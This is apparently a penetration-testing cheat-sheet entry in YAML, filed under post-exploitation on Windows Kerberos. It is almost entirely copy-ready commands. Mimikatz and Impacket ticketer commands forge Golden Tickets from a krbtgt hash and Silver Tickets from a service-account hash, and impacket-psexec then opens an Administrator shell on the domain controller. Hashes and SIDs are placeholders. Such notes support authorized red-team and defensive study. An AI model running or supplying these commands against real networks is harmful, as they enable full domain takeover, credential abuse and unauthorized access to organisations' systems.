---
description: |
  Kerberos ticket forgery — forge Golden Tickets (krbtgt hash, full domain access) and Silver Tickets (service account hash, specific service access).
commands:
  - have: Hash
    cmd: |
      # Golden Ticket — mimikatz (requires krbtgt NTLM hash)
      mimikatz.exe "kerberos::golden /user:Administrator /domain:senshu.sh /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /krbtgt:NTHASH /ptt"

      # Golden Ticket — Impacket ticketer
      impacket-ticketer -nthash NTHASH -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX -domain senshu.sh Administrator
      export KRB5CCNAME=Administrator.ccache
      impacket-psexec senshu.sh/Administrator@DC.senshu.sh -k -no-pass

      # Silver Ticket — mimikatz (requires service account NTLM hash)
      mimikatz.exe "kerberos::golden /user:Administrator /domain:senshu.sh /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /target:DC.senshu.sh /service:cifs /rc4:NTHASH /ptt"

      # Silver Ticket — Impacket ticketer
      impacket-ticketer -nthash NTHASH -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX -domain senshu.sh -spn cifs/DC.senshu.sh Administrator

      # Note: Golden Ticket = krbtgt hash → full domain compromise
      # Note: Silver Ticket = service account hash → access to that specific service only
phase:
  - Post-Exploitation
target_os:
  - Windows
services:
  - Kerberos
techniques:
  - Ticket_Forgery
references:
  - https://github.com/gentilkiwi/mimikatz
  - https://github.com/fortra/impacket
  - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/golden-ticket.html
---
